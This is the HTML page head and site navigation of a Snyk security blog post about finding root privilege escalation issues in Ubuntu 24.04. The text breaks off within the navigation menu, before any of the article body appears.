<!DOCTYPE html><html lang="en-US"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>Abusing Ubuntu 24.04 features for root privilege escalation | Snyk</title><meta name="robots" content="index,follow,max-image-preview:large"/><meta name="description" content="With the recent release of Ubuntu 24.04, we at Snyk Security Labs thought it would be interesting to examine the latest version of this Linux distribution to see if we could find any interesting privilege escalation vulnerabilities."/><link rel="alternate" hrefLang="x-default" href="https://snyk.io/blog/abusing-ubuntu-root-privilege-escalation/"/><link rel="alternate" hrefLang="en" href="https://snyk.io/blog/abusing-ubuntu-root-privilege-escalation/"/><link rel="alternate" hrefLang="de" href="https://snyk.io/de/blog/abusing-ubuntu-root-privilege-escalation/"/><link rel="alternate" hrefLang="fr" href="https://snyk.io/fr/blog/abusing-ubuntu-root-privilege-escalation/"/><link rel="alternate" hrefLang="ja" href="https://snyk.io/jp/blog/abusing-ubuntu-root-privilege-escalation/"/><link rel="alternate" hrefLang="pt-BR" href="https://snyk.io/pt-BR/blog/abusing-ubuntu-root-privilege-escalation/"/><meta name="twitter:card" content="summary_large_image"/><meta property="og:title" content="Abusing Ubuntu 24.04 features for root privilege escalation | Snyk"/><meta property="og:description" content="With the recent release of Ubuntu 24.04, we at Snyk Security Labs thought it would be interesting to examine the latest version of this Linux distribution to see if we could find any interesting privilege escalation vulnerabilities."/><meta property="og:url" content="https://snyk.io/blog/abusing-ubuntu-root-privilege-escalation/"/><meta property="og:type" content="article"/><meta property="article:published_time" content="2024-09-09T00:00-05:00"/><meta property="og:image" content="https://res.cloudinary.com/snyk/image/upload/v1686163009/feature-snyk-platform-learn-getting-snyk-setup.png"/><meta property="og:image:alt" content="feature-snyk-platform-learn-getting-snyk-setup"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="628"/><meta property="og:locale" content="en-US"/><meta property="og:site_name" content="Snyk"/><link rel="canonical" href="https://snyk.io/blog/abusing-ubuntu-root-privilege-escalation/"/><meta property="article:tag" content="security"/><meta property="article:tag" content="engineering"/><meta property="article:tag" content="awareness"/><meta property="article:tag" content="blog"/><meta property="article:tag" content="snyk-container"/><meta property="article:tag" content="container-security"/><meta property="article:tag" content="open-source-security"/><meta property="article:tag" content="security-labs"/><link rel="preload" as="image" imageSrcSet="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=16&amp;q=75 16w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=32&amp;q=75 32w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=48&amp;q=75 48w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=64&amp;q=75 64w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=96&amp;q=75 96w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=128&amp;q=75 128w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=256&amp;q=75 256w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=384&amp;q=75 384w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=580&amp;q=75 580w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=960&amp;q=75 960w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=1240&amp;q=75 1240w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=2560&amp;q=75 2560w" imageSizes="(max-width: 960px) 100vw, 0vw" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=16&amp;q=75 16w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=32&amp;q=75 32w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=48&amp;q=75 48w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=64&amp;q=75 64w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=96&amp;q=75 96w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=128&amp;q=75 128w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=256&amp;q=75 256w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=384&amp;q=75 384w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=580&amp;q=75 580w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=960&amp;q=75 960w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=1240&amp;q=75 1240w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=2560&amp;q=75 2560w" imageSizes="(min-width: 961px) 25vw, 0vw" fetchpriority="high"/><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","datePublished":"2024-09-09T00:00-05:00","description":"With the recent release of Ubuntu 24.04, we at Snyk Security Labs thought it would be interesting to examine the latest version of this Linux distribution to see if we could find any interesting privilege escalation vulnerabilities.","mainEntityOfPage":{"@type":"WebPage"},"headline":"Abusing Ubuntu 24.04 features for root privilege escalation","image":["https://res.cloudinary.com/snyk/image/upload/v1686163009/feature-snyk-platform-learn-getting-snyk-setup.png"],"dateModified":"2024-09-09T00:00-05:00","author":[{"@type":"Person","name":"Rory McNamara"}]}</script><script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","@id":"https://snyk.io/#organization","name":"Snyk","url":"https://snyk.io","logo":"https://res.cloudinary.com/snyk/image/upload/v1588772106/title-card-vertical-white-1.png","sameAs":["https://www.facebook.com/snyksec/","https://twitter.com/snyksec"]}</script><meta name="next-head-count" content="36"/><script id="google-tag-manager-datalayer-init" data-nscript="beforeInteractive">
						// create dataLayer
						window.dataLayer = window.dataLayer || [];
						function gtag() {
							dataLayer.push(arguments);
						}
						// set „denied" as default for both ad and analytics storage, as well as ad_user_data and ad_personalization,
						gtag("consent", "default", {
							ad_user_data: "denied",
							ad_personalization: "denied",
							ad_storage: "denied",
							analytics_storage: "denied",
							wait_for_update: 2000 // milliseconds to wait for update
						});
						// Enable ads data redaction by default [optional]
						gtag("set", "ads_data_redaction", true);
					</script><script id="google-tag-manager-init" data-nscript="beforeInteractive">
						// Google Tag Manager
						(function(w, d, s, l, i) {
							w[l] = w[l] || [];
							w[l].push({
								'gtm.start': new Date().getTime(),
								event: 'gtm.js'
								});
							var f = d.getElementsByTagName(s)[0],
							j = d.createElement(s),
							dl = l != 'dataLayer' ? '&l=' + l : '';
							j.async = true;
							j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
							f.parentNode.insertBefore(j, f);
						})(window, document, 'script', 'dataLayer', 'GTM-T8QMQW9');
					</script><link rel="preload" href="/_next/static/css/865026b9ce604023.css" as="style"/><link rel="stylesheet" href="/_next/static/css/865026b9ce604023.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script defer="" src="/_next/static/chunks/8315.792a63e0d76aa695.js"></script><script defer="" src="/_next/static/chunks/9573-17e4bcc3a84f919d.js"></script><script defer="" src="/_next/static/chunks/9255.55279be3e9c1f7fd.js"></script><script defer="" src="/_next/static/chunks/5878.04fca1479d8f782e.js"></script><script defer="" src="/_next/static/chunks/651.3073472e2bfc81da.js"></script><script defer="" src="/_next/static/chunks/3172.baecf1a7b0fdc823.js"></script><script src="/_next/static/chunks/webpack-dc313e1414b8f606.js" defer=""></script><script src="/_next/static/chunks/framework-945b357d4a851f4b.js" defer=""></script><script src="/_next/static/chunks/main-51ef5c3c654b7f9c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-ab98763e4138e815.js" defer=""></script><script src="/_next/static/chunks/3738-e257518af563c0a0.js" defer=""></script><script src="/_next/static/chunks/2135-5b964b3926facfba.js" defer=""></script><script src="/_next/static/chunks/647-5ea23efad2434481.js" defer=""></script><script src="/_next/static/chunks/9231-8c906a839eb00ac8.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5Bslug%5D-4c673e6984d9d1cd.js" defer=""></script><script src="/_next/static/PGQdZpz4YQpcA7TmIHs8b/_buildManifest.js" defer=""></script><script src="/_next/static/PGQdZpz4YQpcA7TmIHs8b/_ssgManifest.js" defer=""></script></head><body id="snyk" class="snyk-brand-ui"><noscript>You need to enable JavaScript to run this app.</noscript><div id="__next"><div class="bg-page" data-page-theme="default"><a href="#main-content" rel="nofollow" class="sr-focus-only button primary">Skip to main content</a><header class="brandui-navigation" data-component="Primary Navigation"><nav class="navigation"><div class="navigation-logo"><a class="w-1 d-block radius-small" aria-label="Snyk home" href="/"><div class="snyk-logo logo-default-solid" data-component="Snyk Logo"></div></a></div><button class="toggle-menu" title="Mobile menu trigger"></button><div class="navigation-wrapper"><ul class="navigation-menu"><li class="navigation-item" data-component="Nav Item"><span tabindex="0" class="nav-dropdown" aria-expanded="false" role="button">Products</span><div class="navigation-submenu" aria-hidden="true" data-component="Sub-Menu"><div class="submenu-columns"><div class="submenu-column" data-component="Sub Menu Column"><div class="submenu-column-row"><p id="column-label-Products" class="submenu-column-label">Products</p><ul class="submenu-nav-items"><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link spotlight" data-is-last="false" href="/product/"><i class="general-icon icon-blocks"></i><div class="submenu-link-copy"><p class="submenu-link-label">What is Snyk?</p><p class="submenu-link-desc">Developer-first security in action</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/product/snyk-code/"><i class="general-icon icon-snyk-code"></i><div class="submenu-link-copy"><p class="submenu-link-label">Snyk Code</p><p class="submenu-link-desc">Secure your code as it&#x27;s written</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/product/open-source-security-management/"><i class="general-icon icon-snyk-oss"></i><div class="submenu-link-copy"><p class="submenu-link-label">Snyk Open Source</p><p class="submenu-link-desc">Avoid vulnerable dependencies</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/product/container-vulnerability-management/"><i class="general-icon icon-snyk-container"></i><div class="submenu-link-copy"><p class="submenu-link-label">Snyk Container</p><p class="submenu-link-desc">Keep your base images secure</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/product/infrastructure-as-code-security/"><i class="general-icon icon-snyk-iac"></i><div class="submenu-link-copy"><p class="submenu-link-label">Snyk IaC</p><p class="submenu-link-desc">Fix IaC misconfigurations in-code</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/product/snyk-apprisk/"><i class="general-icon icon-snyk-apprisk"></i><div class="submenu-link-copy"><p class="submenu-link-label">Snyk AppRisk</p><p class="submenu-link-desc">Reduce risk across your business</p></div></a></li></ul></div><div class="submenu-column-row"><ul class="submenu-nav-items"><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/plans/"><i class="general-icon icon-monetization"></i><div class="submenu-link-copy"><p class="submenu-link-label">Pricing</p></div></a></li></ul></div></div><div class="submenu-column" data-component="Sub Menu Column"><div class="submenu-column-row"><p id="column-label-Solutions" class="submenu-column-label">Solutions</p><ul class="submenu-nav-items"><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link spotlight" data-is-last="false" href="/platform/"><i class="general-icon icon-checkbox-hover"></i><div class="submenu-link-copy"><p class="submenu-link-label">Why Snyk?</p><p class="submenu-link-desc">Modern security in a single platform</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/solutions/application-security/"><i class="general-icon icon-shield"></i><div class="submenu-link-copy"><p class="submenu-link-label">Application security</p><p class="submenu-link-desc">Build secure, stay secure</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/solutions/software-supply-chain-security/"><i class="general-icon icon-supply-chain"></i><div class="submenu-link-copy"><p class="submenu-link-label">Software supply chain security</p><p class="submenu-link-desc">Mitigate supply chain risk</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/solutions/secure-ai-generated-code/"><i class="general-icon icon-brain"></i><div class="submenu-link-copy"><p class="submenu-link-label">Secure-AI-generated code</p><p class="submenu-link-desc">AI writes, Snyk secures</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/solutions/zero-day-vulnerability-security/"><i class="general-icon icon-info-warning"></i><div class="submenu-link-copy"><p class="submenu-link-label">Zero-day vulnerabilities</p><p class="submenu-link-desc">Fix the first day with Snyk </p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/platform/security-intelligence/"><i class="general-icon icon-light-bulb"></i><div class="submenu-link-copy"><p class="submenu-link-label">Security Intelligence</p><p class="submenu-link-desc">Comprehensive vulnerability data</p></div></a></li></ul></div></div><div class="submenu-column" data-component="Sub Menu Column"><div class="submenu-column-row"><p id="column-label-Platform" class="submenu-column-label">Platform</p><ul class="submenu-nav-items"><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/platform/deepcode-ai/"><i class="general-icon icon-ai-sparkles"></i><div class="submenu-link-copy"><p class="submenu-link-label">DeepCode AI</p><p class="submenu-link-desc">Purpose-built security AI</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/integrations/"><i class="general-icon icon-eclipse"></i><div class="submenu-link-copy"><p class="submenu-link-label">Integrations</p><p class="submenu-link-desc">SDLC-spanning security</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/code-checker/"><i class="general-icon icon-info-scan"></i><div class="submenu-link-copy"><p class="submenu-link-label">Code Checker</p><p class="submenu-link-desc">Write better code for free</p></div></a></li></ul></div><div class="submenu-column-row"><p id="column-label-Audience" class="submenu-column-label">Audience</p><ul class="submenu-nav-items"><li class="submenu-nav-item" data-component="Sub Menu Item"><a href="https://go.snyk.io/2024-dev-onboarding.html" rel="noopener noreferrer" target="_blank" class="submenu-link link-external" data-is-last="false"><i class="general-icon icon-developer"></i><div class="submenu-link-copy"><p class="submenu-link-label">Snyk for devs</p><p class="submenu-link-desc">Dev-centric info on demand</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/government-security-solution/"><i class="general-icon icon-government"></i><div class="submenu-link-copy"><p class="submenu-link-label">Snyk for government</p><p class="submenu-link-desc">Mission-informed AppSec</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/lp/securing-ai-generated-code/"><i class="general-icon icon-handbook"></i><div class="submenu-link-copy"><p class="submenu-link-label">Leaders handbook</p><p class="submenu-link-desc">SAST essentials for genAI</p></div></a></li></ul></div></div><div class="submenu-column" data-component="Sub Menu Column"><div class="card-wrapper w-3 marg-h-auto" data-component="Media Card"><article class="card spotlight"><div class="card-banner"><div class="w-full marg-h-auto p-relative aspect-ratio-banner" data-component="Banner"><img alt="default-report.b205b2e0" loading="lazy" decoding="async" data-nimg="fill" class="object-fit-cover" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" src="https://res.cloudinary.com/snyk/image/upload/v1729618965/default-report.b205b2e0.svg"/></div></div><div class="card-body"><p class="txt-subhead-small txt-ui-headline txt-line-clamp-2" data-component="Title">Secure Adoption in Gen AI Era Report</p><a href="https://go.snyk.io/secure-adoption-in-genai-era.html" rel="noopener noreferrer" target="_blank" class="button tertiary max-w-full marg-t-auto link-stretched" title="Read report" data-component="Next Link">Read report</a></div></article></div></div></div></div></li><li class="navigation-item" data-component="Nav Item"><span tabindex="0" class="nav-dropdown" aria-expanded="false" role="button">Resources</span><div class="navigation-submenu" aria-hidden="true" data-component="Sub-Menu"><div class="submenu-columns"><div class="submenu-column" data-component="Sub Menu Column"><div class="submenu-column-row"><p id="column-label-Our resources" class="submenu-column-label">Our resources</p><ul class="submenu-nav-items"><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/resource-library/"><i class="general-icon icon-library"></i><div class="submenu-link-copy"><p class="submenu-link-label">Resource library</p><p class="submenu-link-desc">Browse our extensive database</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/customer-resources/"><i class="general-icon icon-booklet"></i><div class="submenu-link-copy"><p class="submenu-link-label">Customer resources</p><p class="submenu-link-desc">The one stop shop for customers</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/ethical-hacking-resources/"><i class="general-icon icon-lock-heart"></i><div class="submenu-link-copy"><p class="submenu-link-label">Ethical hacking</p><p class="submenu-link-desc">How ethical hacking can help you</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/security-leaders/"><i class="general-icon icon-shield-star"></i><div class="submenu-link-copy"><p class="submenu-link-label">Security leaders</p><p class="submenu-link-desc">Insights from industry leaders</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/snyk-top-10/"><i class="general-icon icon-shield-chevron-up"></i><div class="submenu-link-copy"><p class="submenu-link-label">Top 10 vulns</p><p class="submenu-link-desc">See the most common vuln types</p></div></a></li></ul></div><div class="submenu-column-row"><ul class="submenu-nav-items"><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/blog/"><i class="general-icon icon-blog"></i><div class="submenu-link-copy"><p class="submenu-link-label">Blog Section</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/podcasts/the-secure-developer/"><i class="general-icon icon-podcast"></i><div class="submenu-link-copy"><p class="submenu-link-label">Snyk&#x27;s podcasts</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a href="https://www.youtube.com/snyksec" rel="noopener noreferrer" target="_blank" class="submenu-link link-external" data-is-last="false"><i class="general-icon icon-youtube"></i><div class="submenu-link-copy"><p class="submenu-link-label">Snyk’s YouTube</p></div></a></li></ul></div></div><div class="submenu-column" data-component="Sub Menu Column"><div class="submenu-column-row"><p id="column-label-Our ecosystem" class="submenu-column-label">Our ecosystem</p><ul class="submenu-nav-items"><li class="submenu-nav-item" data-component="Sub Menu Item"><a href="https://learn.snyk.io" rel="noopener noreferrer" target="_blank" class="submenu-link link-external" data-is-last="false"><i class="general-icon icon-snyk-learn"></i><div class="submenu-link-copy"><p class="submenu-link-label">Snyk Learn</p><p class="submenu-link-desc">Security education from Snyk</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a href="https://docs.snyk.io/" rel="noopener noreferrer" target="_blank" class="submenu-link link-external" data-is-last="false"><i class="general-icon icon-snyk-docs"></i><div class="submenu-link-copy"><p class="submenu-link-label">Snyk user docs</p><p class="submenu-link-desc">Get started with Snyk</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a href="https://support.snyk.io/hc/en-us" rel="noopener noreferrer" target="_blank" class="submenu-link link-external" data-is-last="false"><i class="general-icon icon-snyk-support"></i><div class="submenu-link-copy"><p class="submenu-link-label">Snyk Support</p><p class="submenu-link-desc">How can we help?</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a href="https://security.snyk.io/" rel="noopener noreferrer" target="_blank" class="submenu-link link-external" data-is-last="false"><i class="general-icon icon-vuln-db"></i><div class="submenu-link-copy"><p class="submenu-link-label">Snyk Vuln Database</p><p class="submenu-link-desc">Find new vulnerabilities</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a href="https://updates.snyk.io/" rel="noopener noreferrer" target="_blank" class="submenu-link link-external" data-is-last="false"><i class="general-icon icon-updates"></i><div class="submenu-link-copy"><p class="submenu-link-label">Snyk Updates</p><p class="submenu-link-desc">Stay in the loop</p></div></a></li></ul></div></div><div class="submenu-column" data-component="Sub Menu Column"><div class="submenu-column-row"><p id="column-label-Our community" class="submenu-column-label">Our community</p><ul class="submenu-nav-items"><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/events/"><i class="general-icon icon-events"></i><div class="submenu-link-copy"><p class="submenu-link-label">Events &amp; webinars</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/snyk-ambassadors/"><i class="general-icon icon-ambassadors"></i><div class="submenu-link-copy"><p class="submenu-link-label">Ambassadors</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a href="https://snyk.co/discordcommunity" rel="noopener noreferrer" target="_blank" class="submenu-link link-external" data-is-last="false"><i class="general-icon icon-discord"></i><div class="submenu-link-copy"><p class="submenu-link-label">Discord channel</p></div></a></li></ul></div></div><div class="submenu-column" data-component="Sub Menu Column"><div class="card-wrapper w-3 marg-h-auto" data-component="Media Card"><article class="card spotlight"><div class="card-banner"><div class="w-full marg-h-auto p-relative aspect-ratio-banner" data-component="Banner"><img alt="feature-snyk-snowflake" loading="lazy" decoding="async" data-nimg="fill" class="object-fit-cover" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="(min-width: 980px) 50vw, 100vw" srcSet="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1717461856%2Ffeature-snyk-snowflake.jpg&amp;w=384&amp;q=75 384w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1717461856%2Ffeature-snyk-snowflake.jpg&amp;w=580&amp;q=75 580w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1717461856%2Ffeature-snyk-snowflake.jpg&amp;w=960&amp;q=75 960w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1717461856%2Ffeature-snyk-snowflake.jpg&amp;w=1240&amp;q=75 1240w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1717461856%2Ffeature-snyk-snowflake.jpg&amp;w=2560&amp;q=75 2560w" src="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1717461856%2Ffeature-snyk-snowflake.jpg&amp;w=2560&amp;q=75"/></div></div><div class="card-body"><p class="txt-subhead-small txt-ui-headline txt-line-clamp-2" data-component="Title">Extend the power of your AppSec data with the new Snyk and Snowflake integration</p><a class="button tertiary max-w-full marg-t-auto link-stretched" title="Read blog" data-component="Next Link" href="/blog/snyk-snowflake-data-share/">Read blog</a></div></article></div></div></div></div></li><li class="navigation-item" data-component="Nav Item"><span tabindex="0" class="nav-dropdown" aria-expanded="false" role="button">Company</span><div class="navigation-submenu" aria-hidden="true" data-component="Sub-Menu"><div class="submenu-columns"><div class="submenu-column" data-component="Sub Menu Column"><div class="submenu-column-row"><p id="column-label-Company" class="submenu-column-label">Company</p><div class="max-w-3 mobile:marg-t-small d-flex flex-col gap-medium"><h2 class="txt-headline-small">The developer security platform</h2><div class="rich-text"><p>Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.</p></div><a class="button primary w-content" title="More about us" data-component="Next Link" href="/about/">More about us</a></div></div></div><div class="submenu-column" data-component="Sub Menu Column"><div class="submenu-column-row"><ul class="submenu-nav-items"><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/services/"><i class="general-icon icon-services"></i><div class="submenu-link-copy"><p class="submenu-link-label">Our services</p><p class="submenu-link-desc">Maximize your AppSec ROI</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/customers/"><i class="general-icon icon-customers"></i><div class="submenu-link-copy"><p class="submenu-link-label">Our customers</p><p class="submenu-link-desc">We help customers save time and money</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/partners/"><i class="general-icon icon-partners"></i><div class="submenu-link-copy"><p class="submenu-link-label">Our partners</p><p class="submenu-link-desc">Bringing business class security with partners</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/case-studies/"><i class="general-icon icon-briefcase"></i><div class="submenu-link-copy"><p class="submenu-link-label">Case studies</p><p class="submenu-link-desc">Check out our customer stories and stats</p></div></a></li></ul></div></div><div class="submenu-column" data-component="Sub Menu Column"><div class="submenu-column-row"><ul class="submenu-nav-items"><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/news/"><i class="general-icon icon-newsroom"></i><div class="submenu-link-copy"><p class="submenu-link-label">Newsroom</p><p class="submenu-link-desc">See the latest press releases</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/contact-us/"><i class="general-icon icon-contact"></i><div class="submenu-link-copy"><p class="submenu-link-label">Contact us</p><p class="submenu-link-desc">Get in touch with any feedback or questions</p></div></a></li><li class="submenu-nav-item" data-component="Sub Menu Item"><a class="submenu-link" data-is-last="false" href="/careers/"><i class="general-icon icon-hand-wave"></i><div class="submenu-link-copy"><p class="submenu-link-label">Careers</p><p class="submenu-link-desc">Join Snyk today</p></div></a></li></ul></div></div><div class="submenu-column" data-component="Sub Menu Column"><div class="card-wrapper w-3 marg-h-auto" data-component="Media Card"><article class="card spotlight"><div class="card-banner"><div class="w-full marg-h-auto p-relative aspect-ratio-banner" data-component="Banner"><img alt="Snyk_Probely" loading="lazy" decoding="async" data-nimg="fill" class="object-fit-cover" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="(min-width: 980px) 50vw, 100vw" srcSet="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1730905024%2FSnyk_Probely.jpg&amp;w=384&amp;q=75 384w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1730905024%2FSnyk_Probely.jpg&amp;w=580&amp;q=75 580w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1730905024%2FSnyk_Probely.jpg&amp;w=960&amp;q=75 960w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1730905024%2FSnyk_Probely.jpg&amp;w=1240&amp;q=75 1240w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1730905024%2FSnyk_Probely.jpg&amp;w=2560&amp;q=75 2560w" 